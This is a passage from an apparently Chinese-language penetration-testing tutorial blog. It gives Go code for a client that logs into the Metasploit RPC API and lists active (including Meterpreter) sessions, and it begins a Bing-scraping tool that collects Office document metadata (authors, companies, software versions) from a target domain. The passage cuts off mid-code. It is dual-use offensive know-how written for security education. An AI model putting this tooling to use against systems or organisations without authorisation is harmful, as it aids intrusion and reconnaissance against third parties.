RPC</code>服务器所接受的方式，将结构化数据，序列化为<code>MessagePack</code>格式，数据以数组的而不是映射的形式传递，因此，<code>RPC</code>希望接受到的是作为值的<code>位置数组</code>。&#x3D;&#x3D;默认情况下，结构体将被编码为包含从属性名称推导出来的键名映射。&#x3D;&#x3D;要禁用此功能且将其强制将其编码为<code>位置数组</code>，必须添加一个名为<code>_msgpack</code>的特殊字段，该字段利用描述符<code>asArray</code>，显示指示编码器&#x2F;解码器将数据视为数组</p><p>响应结构体<code>SessionListRes</code>包含响应字段和结构体属性的一一对应关系，该数据本质上是一个请按套映射，外层映射是会话详细信息的会话标识符，内层映射是内层会话的详细信息。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rpc</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> sessionListReq <span class="keyword">struct</span> &#123;</span><br><span class="line">_msgpack <span class="keyword">struct</span>&#123;&#125; <span class="string">`msgpack:&quot;,asArray&quot;`</span></span><br><span class="line">Method   <span class="type">string</span></span><br><span class="line">Token    <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> SessionListRes <span class="keyword">struct</span> &#123;</span><br><span class="line">ID          <span class="type">uint32</span> <span class="string">`msgpack:&quot;,omitempty&quot;`</span></span><br><span class="line">Type        <span class="type">string</span> <span class="string">`msgpack:&quot;type&quot;`</span></span><br><span class="line">TunnelLocal <span class="type">string</span> <span class="string">`msgpack:&quot;tunnel_local&quot;`</span></span><br><span class="line">TunnelPeer  <span class="type">string</span> <span class="string">`msgpack:&quot;tunnel_peer&quot;`</span></span><br><span class="line">ViaExploit  <span class="type">string</span> <span class="string">`msgpack:&quot;via_exploit&quot;`</span></span><br><span class="line">ViaPayload  <span class="type">string</span> <span class="string">`msgpack:&quot;via_payload&quot;`</span></span><br><span class="line">Description <span class="type">string</span> <span class="string">`msgpack:&quot;desc&quot;`</span></span><br><span class="line">Info        <span class="type">string</span> <span class="string">`msgpack:&quot;info&quot;`</span></span><br><span class="line">Workspace   <span class="type">string</span> <span class="string">`msgpack:&quot;workspace&quot;`</span></span><br><span class="line">SessionHost <span class="type">string</span> <span class="string">`msgpack:&quot;session_host&quot;`</span></span><br><span class="line">SessionPort <span class="type">int</span>    <span class="string">`msgpack:&quot;session_port&quot;`</span></span><br><span class="line">Username    <span class="type">string</span> <span class="string">`msgpack:&quot;username&quot;`</span></span><br><span class="line">UUID        <span class="type">string</span> <span class="string">`msgpack:&quot;uuid&quot;`</span></span><br><span class="line">ExploitUUID <span class="type">string</span> <span class="string">`msgpack:&quot;exploit_uuid&quot;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-获取有效令牌"><a href="#2-获取有效令牌" class="headerlink" title="2. 获取有效令牌"></a>2. 获取有效令牌</h3><p>现在，我们需要获取一个有效的登录令牌来获取请求，为此，我们将为api方法<code>auth.login()</code>发出一个登录请求，该请求满足以下条件</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220301231549.png"></p><p>登录失败的话</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220301231713.png"></p><p>还有登出令牌的功能</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220301231814.png"></p><h3 id="3-定义请求和响应"><a href="#3-定义请求和响应" class="headerlink" title="3. 定义请求和响应"></a>3. 定义请求和响应</h3><p><code>suth.login</code>和<code>auth.logout</code>同理，我们需要使用描述控制符将请求序列化为数组并将响应视为映射</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">type</span> logoutReq <span class="keyword">struct</span> &#123;</span><br><span class="line">_msgpack    <span class="keyword">struct</span>&#123;&#125; <span class="string">`msgpack:&quot;,asArray&quot;`</span></span><br><span class="line">Method      <span class="type">string</span></span><br><span class="line">Token       <span class="type">string</span></span><br><span class="line">LogoutToken <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> logoutRes <span class="keyword">struct</span> &#123;</span><br><span class="line">Result <span class="type">string</span> <span class="string">`msgpack:&quot;result&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> loginReq <span class="keyword">struct</span> &#123;</span><br><span class="line">_msgpack <span class="keyword">struct</span>&#123;&#125; <span class="string">`msgpack:&quot;,asArray&quot;`</span></span><br><span class="line">Method   <span class="type">string</span></span><br><span class="line">Username <span class="type">string</span></span><br><span class="line">Password <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> loginRes <span class="keyword">struct</span> &#123;</span><br><span class="line">Result       <span class="type">string</span> <span class="string">`msgpack:&quot;result&quot;`</span></span><br><span class="line">Token        <span class="type">string</span> <span class="string">`msgpack:&quot;token&quot;`</span></span><br><span class="line">Error        <span class="type">bool</span>   <span class="string">`msgpack:&quot;error&quot;`</span></span><br><span class="line">ErrorClass   <span class="type">string</span> <span class="string">`msgpack:&quot;error_class&quot;`</span></span><br><span class="line">ErrorMessage <span class="type">string</span> <span class="string">`msgpack:&quot;error_message&quot;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>go可以自动的对登录响应进行序列化，仅填充了存在的字段，这意味着我们可以使用单一结构式表示成功或者失败</p><h3 id="4-创建配置结构体和RPC方法"><a href="#4-创建配置结构体和RPC方法" class="headerlink" title="4. 创建配置结构体和RPC方法"></a>4. 创建配置结构体和RPC方法</h3><p>创建一个结构体类型，以供数据隐式引用</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Metasploit <span class="keyword">struct</span> &#123;</span><br><span class="line">host  <span class="type">string</span></span><br><span class="line">user  <span class="type">string</span></span><br><span class="line">pass  <span class="type">string</span></span><br><span class="line">token <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">New</span><span class="params">(host, user, pass <span class="type">string</span>)</span></span> *Metasploit &#123;</span><br><span class="line">msf := &amp;Metasploit&#123;</span><br><span class="line">host: host,</span><br><span class="line">user: user,</span><br><span class="line">pass: pass,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> msf</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-执行远程调用"><a href="#5-执行远程调用" class="headerlink" title="5. 执行远程调用"></a>5. 执行远程调用</h3><p>构建一个方法，执行远程调用。为了防止大量的代码重复，先构建一个可以执行，序列化，反序列化和HTTP通信逻辑的方法 send()</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(msf *Metasploit)</span></span> send(req <span class="keyword">interface</span>&#123;&#125;, res <span class="keyword">interface</span>&#123;&#125;) <span class="type">error</span> &#123;</span><br><span class="line">buf := <span class="built_in">new</span>(bytes.Buffer)</span><br><span class="line">msgpack.NewEncoder(buf).Encode(req)</span><br><span class="line">dest := fmt.Sprintf(<span class="string">&quot;http://%s/api&quot;</span>, msf.host)</span><br><span class="line">r, err := http.Post(dest, <span class="string">&quot;binary/message-pack&quot;</span>, buf)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> r.Body.Close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err := msgpack.NewDecoder(r.Body).Decode(&amp;res); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>send</code>方法中，接受interface{}类型的请求和响应参数。使用此接口类型，可以将任何请求结构体传递到方法中，然后序列化发送到服务器，无需使用显示返回响应的方法。</p><p>接下来，使用<code>msgPack</code>库对请求进行<code>URL</code>编码，可以按照处理其他标准结构化数据的数据逻辑：首先通过NewEncoder()创建编码器，然后调用<code>Encode</code>方法，这将用<code>MessagePack</code>编码表示的请求体填充buf变量。之后发出POST请求，将主题设置为序列化数据。</p><p>然后接下来定义三个方法，每个方法使用相同的常规流程。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(msf *Metasploit)</span></span> Login() <span class="type">error</span> &#123;</span><br><span class="line">ctx := &amp;loginReq&#123;</span><br><span class="line">Method:   <span class="string">&quot;auth.login&quot;</span>,</span><br><span class="line">Username: msf.user,</span><br><span class="line">Password: msf.pass,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> res loginRes</span><br><span class="line"><span class="keyword">if</span> err := msf.send(ctx, &amp;res); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">msf.token = res.Token</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(msf *Metasploit)</span></span> Logout() <span class="type">error</span> &#123;</span><br><span class="line">ctx := &amp;logoutReq&#123;</span><br><span class="line">Method:      <span class="string">&quot;auth.logout&quot;</span>,</span><br><span class="line">Token:       msf.token,</span><br><span class="line">LogoutToken: msf.token,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> res logoutRes</span><br><span class="line"><span class="keyword">if</span> err := msf.send(ctx, &amp;res); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">msf.token = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(msf *Metasploit)</span></span> SessionList() (<span class="keyword">map</span>[<span class="type">uint32</span>]SessionListRes, <span class="type">error</span>) &#123;</span><br><span class="line">req := &amp;sessionListReq&#123;Method: <span class="string">&quot;session.list&quot;</span>, Token: msf.token&#125;</span><br><span class="line">res := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">uint32</span>]SessionListRes)</span><br><span class="line"><span class="keyword">if</span> err := msf.send(req, &amp;res); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> id, session := <span class="keyword">range</span> res &#123;</span><br><span class="line">session.ID = id</span><br><span class="line">res[id] = session</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是，<code>RPC</code>函数 session.list()需要有效的身份令牌，这就意味着必须要先登录，但是才能掉用方法<code>SessionList()</code></p><p>所以可以对<code>New</code>函数做一个更改</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">New</span><span class="params">(host, user, pass <span class="type">string</span>)</span></span> (*Metasploit,<span class="type">error</span>)&#123;</span><br><span class="line">msf := &amp;Metasploit&#123;</span><br><span class="line">host: host,</span><br><span class="line">user: user,</span><br><span class="line">pass: pass,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err := msf.Login(); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>,err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> msf,<span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="6-执行"><a href="#6-执行" class="headerlink" title="6.执行"></a>6.执行</h3><p>创建 <code>clinet/main.go</code>文件</p><p>这里没用获取环境变量，原文是</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">host := os.Getenv(<span class="string">&quot;MSFHOST&quot;</span>)</span><br><span class="line">pass := os.Getenv(<span class="string">&quot;MSFPASS&quot;</span>)</span><br></pre></td></tr></table></figure><p>这里输入自己的数值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;MSF/rpc&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">host := <span class="string">&quot;&quot;</span></span><br><span class="line">pass := <span class="string">&quot;&quot;</span></span><br><span class="line">user := <span class="string">&quot;msf&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> host == <span class="string">&quot;&quot;</span> || pass == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">log.Fatalln(<span class="string">&quot;Missing required environment variable MSFHOST or MSFPASS&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">msf, err := rpc.New(host, user, pass)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Panicln(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> msf.Logout()</span><br><span class="line"></span><br><span class="line">sessions, err := msf.SessionList()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Panicln(err)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(<span class="string">&quot;Sessions:&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> _, session := <span class="keyword">range</span> sessions &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;%5d  %s\n&quot;</span>, session.ID, session.Info)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220302000546.png"></p><p>如果有<code>Meterpreter</code>会话则会保存下来</p><h2 id="0x04-使用Bing-Scraping解析文档元数据"><a href="#0x04-使用Bing-Scraping解析文档元数据" class="headerlink" title="0x04 使用Bing Scraping解析文档元数据"></a>0x04 使用Bing Scraping解析文档元数据</h2><p>在渗透测试的时候，相对有用的信息可能会非常关键，这些信息会增加我们对目标攻击的可能性。这些信息的来源之一是<code>文档元数据</code>。</p><p>某些情况下，这类信息会包含地理坐标， 应用程序版本，操作系统信息和用户名。</p><p>我们可以使用搜索引擎去检索关于一个组织的特定文件。</p><h3 id="1-配置和环境规划"><a href="#1-配置和环境规划" class="headerlink" title="1. 配置和环境规划"></a>1. 配置和环境规划</h3><p>我们首先对目标进行声明，我们只关注以<code>xlsx</code>,<code>docx</code>,<code>pptx</code>等结尾的<code>Office Open Xml</code>文档，虽然也可以关注旧版的<code>Office</code>数据类型，但是二进制格式使他们成倍增加，并且会在增加代码复杂性的同时降低其可阅读性。对于<code>PDF</code>文件也是如此。</p><p>我们使用抓取<code>HTML</code>页面，而不是使用<code>搜索引擎API</code>，在没有API的情况下，使用页面抓取的方法更为强大。</p><blockquote><p>在这里我们使用一个<code>goquery</code>，他的作用等用于<code>jquery</code></p><p>安装：go get github.com&#x2F;PuerkitoBio&#x2F;goquery</p></blockquote><h3 id="2-定义元数据包"><a href="#2-定义元数据包" class="headerlink" title="2. 定义元数据包"></a>2. 定义元数据包</h3><p>在代码中定义与<code>XML</code>数据集相对应的<code>GO</code>类型，然后将代码放入一个名为 <code>openxml.go</code>的文件中，该文件是我们想要解析的每个<code>XML</code>的其中一种类型，然后添加数据映射和对应的函数，以确定与<code>Appilcation</code>对应的可识别的<code>Office</code>版本</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> metadata</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;encoding/xml&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> OfficeVersions = <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span>&#123;</span><br><span class="line"><span class="string">&quot;16&quot;</span>: <span class="string">&quot;2016&quot;</span>,</span><br><span class="line"><span class="string">&quot;15&quot;</span>: <span class="string">&quot;2013&quot;</span>,</span><br><span class="line"><span class="string">&quot;14&quot;</span>: <span class="string">&quot;2010&quot;</span>,</span><br><span class="line"><span class="string">&quot;12&quot;</span>: <span class="string">&quot;2007&quot;</span>,</span><br><span class="line"><span class="string">&quot;11&quot;</span>: <span class="string">&quot;2003&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> OfficeCoreProperty <span class="keyword">struct</span> &#123;</span><br><span class="line">XMLName        xml.Name <span class="string">`xml:&quot;coreProperties&quot;`</span></span><br><span class="line">Creator        <span class="type">string</span>   <span class="string">`xml:&quot;creator&quot;`</span></span><br><span class="line">LastModifiedBy <span class="type">string</span>   <span class="string">`xml:&quot;lastModifiedBy&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> OfficeAppProperty <span class="keyword">struct</span> &#123;</span><br><span class="line">XMLName     xml.Name <span class="string">`xml:&quot;Properties&quot;`</span></span><br><span class="line">Application <span class="type">string</span>   <span class="string">`xml:&quot;Application&quot;`</span></span><br><span class="line">Company     <span class="type">string</span>   <span class="string">`xml:&quot;Company&quot;`</span></span><br><span class="line">Version     <span class="type">string</span>   <span class="string">`xml:&quot;AppVersion&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(a *OfficeAppProperty)</span></span> GetMajorVersion() <span class="type">string</span> &#123;</span><br><span class="line">tokens := strings.Split(a.Version, <span class="string">&quot;.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(tokens) &lt; <span class="number">2</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;Unknown&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">v, ok := OfficeVersions[tokens[<span class="number">0</span>]]</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;Unknown&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> v</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-把数据映射到结构体"><a href="#3-把数据映射到结构体" class="headerlink" title="3. 把数据映射到结构体"></a>3. 把数据映射到结构体</h3><p>接下来要读取适当的文件内容，并将内容赋值给所定义的结构体代码。为此定义函数<code>NewProperties()</code>和<code>proccess()</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">process</span><span class="params">(f *zip.File, prop <span class="keyword">interface</span>&#123;&#125;)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">rc, err := f.Open()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> rc.Close()</span><br><span class="line"><span class="keyword">if</span> err := xml.NewDecoder(rc).Decode(&amp;prop); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewProperties</span><span class="params">(r *zip.Reader)</span></span> (*OfficeCoreProperty, *OfficeAppProperty, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">var</span> coreProps OfficeCoreProperty</span><br><span class="line"><span class="keyword">var</span> appProps OfficeAppProperty</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, f := <span class="keyword">range</span> r.File &#123;</span><br><span class="line"><span class="keyword">switch</span> f.Name &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;docProps/core.xml&quot;</span>:</span><br><span class="line"><span class="keyword">if</span> err := process(f, &amp;coreProps); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;docProps/app.xml&quot;</span>:</span><br><span class="line"><span class="keyword">if</span> err := process(f, &amp;appProps); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> &amp;coreProps, &amp;appProps, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数<code>NewProperties()</code>接受了一个<code>* zio.Reader</code>的参数，它表示<code>Zip归档</code>文件的<code>io.Reader</code>，使用<code>io.Reader</code>实例，遍历归档文件类型，中所有文件并检查文件名，如果文件名与两个属性文件名中任意一个匹配，则调用函数<code>process()</code>，并且传入文件要和填充的任意两个结构体类型:<code>OfficeCoreProperty</code>或者<code>OfficeAppProperty</code></p><p>函数<code>process</code>接受两个参数，<code>* zip.file</code> 和 <code>interface</code>。此代码接受通用的<code>interface()</code>类型，以允许将文件内容赋给任何数据类型，因为在<code>process</code>中没有特定的数据类型，增加了代码的重用性。在函数内，代码读取文件的内容并将<code>XML</code>数据解码为<code>结构体</code>。</p><h3 id="4-使用Bing搜索和接受文件"><a href="#4-使用Bing搜索和接受文件" class="headerlink" title="4. 使用Bing搜索和接受文件"></a>4. 使用<code>Bing</code>搜索和接受文件</h3><p>现在，我们已经有了打开，读取，解析和提取<code>Office Open Xml</code>文档需要的所有代码，并且知道我们接下来要做什么</p><ol><li>使用适当的过滤器向<code>Bing</code>提交搜索请求以检索目标结果</li><li>从HTML响应中提取<code>HREF(链接)</code>数据以获得文档的导向URL</li><li>为每个导向文档URL提交一个HTTP请求</li><li>解析响应正文以创建<code>zip.Reader</code></li><li>将<code>zip.Reader</code>传递到我们已经开发的代码中以提取元数据</li></ol><blockquote><p>site: 用于过滤特定的域结果</p><p>fileType: 用于根据资源文件类型过滤结果</p><p>instreamset：用于过滤结果以仅包含某些文件扩展名</p></blockquote><p>例如：从<code>nytimes.com</code>中检索<code>docx</code>文件的查询示例：</p><blockquote><p>site:nytimes.com &amp;&amp; filetype: docx &amp;&amp;instreamset:(url title):docx</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220302112348.png"></p><p>接下来，我们要做的是确定<code>文档链接</code>在文档对象模型(DOM)中的位置，可以使用F12进行查看。</p><p>有了这些，我们就可以使用<code>goquery</code>来进行提取与<code>HTML</code>路劲匹配的所有数据元素</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 